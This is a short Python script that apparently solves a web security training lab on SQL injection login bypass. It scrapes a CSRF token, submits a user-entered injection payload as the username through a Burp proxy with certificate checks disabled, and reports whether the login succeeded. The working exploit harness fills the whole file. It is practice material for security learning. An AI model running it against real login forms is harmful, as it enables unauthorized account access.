# Laboratory 02: SQLi allowing login bypass
# Author: Emiliano Rivas (RVXS)

from urllib import request, response
import requests, sys, urllib3
# This helps us to try HTML elements
from bs4 import BeautifulSoup 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

burp_proxies = {
    "http" : "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


def get_csrf_token(session, url):
    # Without proxies
    # request = session.get(url, verify = False)

    # With burp as proxy
    request = session.get(url, verify = False, proxies = burp_proxies)

    soup = BeautifulSoup(request.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def exploit(url, payload):
    session = requests.Session()
    csrf = get_csrf_token(session, url)
    data = {
        "csrf": csrf,
        "username": payload,
        "password": "This is not the real password"
    }

    print(data)

    try:
        # Without a proxy
        # request = session.post(url, data = data, verify = False)

        # Using burpsuite as proxy
        login_request  = session.post(url, data = data, proxies = burp_proxies, verify = False)
        response = login_request.text
    except: 
        print("\nThere was an error making the request")
        sys.exit("\nExiting ...")


    if "Invalid username or password" in response:
        print("\nThe username doesn't exist")
    else:
        if "Log out" in response:
            print("\nInjection successfull, you solved the lab")
        else:
            print("\nThe injection failed")
            sys.exit("\nExiting ...")


def main():
    print("\n-------------------")
    print("WSA Lab-02 Solver")
    print("-------------------\n")

    url = input("Enter the URL: ").strip()
    payload = input("Enter the payload: ").strip()

    exploit(url, payload)

if __name__ == "__main__":
    main()